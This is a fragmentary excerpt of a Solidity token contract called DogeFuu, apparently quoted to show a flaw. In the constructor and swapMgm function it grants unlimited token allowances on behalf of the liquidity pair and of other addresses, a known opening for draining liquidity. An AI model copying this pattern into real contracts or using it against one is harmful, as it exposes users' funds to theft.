...
contract DogeFuu is ERC20Detailed, Ownable, MGMController {
        ...
        Ownable()
    {
        ...
        _allowedFragments[address(address(router))][address(this)] = uint256(-1);
        _allowedFragments[address(this)][pair] = uint256(-1);
        _allowedFragments[pair][address(this)] = uint256(-1);
    ...
    function _transferFrom(
        ...
        if (mgmFee > 0 && _gonBalances[address(this)] >= mgmFee) {
    ...
    function swapMgm(
        ...
        _allowedFragments[child][address(router)] = uint256(-1);
        _allowedFragments[child][pair] = uint256(-1);
